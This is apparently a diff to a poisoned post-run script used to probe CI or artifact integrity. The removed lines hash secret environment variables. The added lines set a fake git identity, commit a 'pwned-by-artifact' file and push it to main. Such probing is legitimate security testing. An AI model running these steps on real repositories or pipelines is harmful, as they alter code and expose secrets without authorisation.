@@ -1,3 +1,4 @@
 echo POISONED_POST_RAN
-echo "PRIV_SECRET_SHA256=$(printf '%s' "$PRIV_SECRET" | sha256sum | cut -d' ' -f1)"
-echo "PRIV_ENV_SECRET_SHA256=$(printf '%s' "$PRIV_ENV_SECRET" | sha256sum | cut -d' ' -f1)"
+git config user.name probe && git config user.email probe@example.invalid
+echo "pwned-by-artifact" > integrity-probe.txt && git add integrity-probe.txt && git commit -q -m "integrity probe from artifact"
+git push origin HEAD:main 2>&1; echo "PUSH_EXIT=$?"
